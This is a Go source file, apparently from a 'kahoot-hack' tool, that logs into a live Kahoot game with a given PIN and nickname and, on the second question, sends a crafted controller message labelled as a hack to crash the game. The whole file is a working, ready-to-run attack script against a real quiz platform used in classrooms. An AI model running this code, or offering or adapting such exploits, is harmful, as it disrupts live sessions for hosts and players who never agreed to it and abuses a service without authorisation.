package main

import (
	"encoding/json"
	"fmt"
	"os"
	"time"

	"github.com/unixpickle/kahoot-hack/kahoot"
)

func main() {
	if len(os.Args) != 3 {
		fmt.Fprintln(os.Stderr, "Usage: crash <game pin> <nickname>")
		os.Exit(1)
	}
	gamePin := os.Args[1]
	nickname := os.Args[2]

	conn, err := kahoot.NewConn(gamePin)
	defer conn.GracefulClose()
	if err != nil {
		fmt.Fprintln(os.Stderr, "failed to connect:", err)
		os.Exit(1)
	}
	if err := conn.Login(nickname); err != nil {
		fmt.Fprintln(os.Stderr, "failed to login:", err)
		os.Exit(1)
	}

	delayCount := 2
	for {
		msg, err := conn.Receive("/service/player")
		if err != nil {
			fmt.Fprintln(os.Stderr, "failed to receive player packet:", err)
			os.Exit(1)
		}
		if data, ok := msg["data"].(map[string]interface{}); ok {
			if contentStr, ok := data["content"].(string); ok {
				var content map[string]interface{}
				if json.Unmarshal([]byte(contentStr), &content) != nil {
					continue
				} else if _, ok := content["questionIndex"]; ok {
					delayCount--
					if delayCount == 0 {
						break
					}
				}
			}
		}
	}

	fmt.Println("got question; crashing...")

	content := kahoot.Message{"choice": 0, "meta": kahoot.Message{"lag": 1000, "device": "HACKS"}}
	encodedContent, _ := json.Marshal(content)
	msg := kahoot.Message{
		"data": kahoot.Message{
			"type":    "message",
			"gameid":  gamePin,
			"host":    "kahoot.it",
			"content": string(encodedContent),
			"id":      6,
		},
	}
	if err := conn.Send("/service/controller", msg); err != nil {
		fmt.Fprintln(os.Stderr, "failed to send hack:", err)
	}

	time.Sleep(time.Second)
}
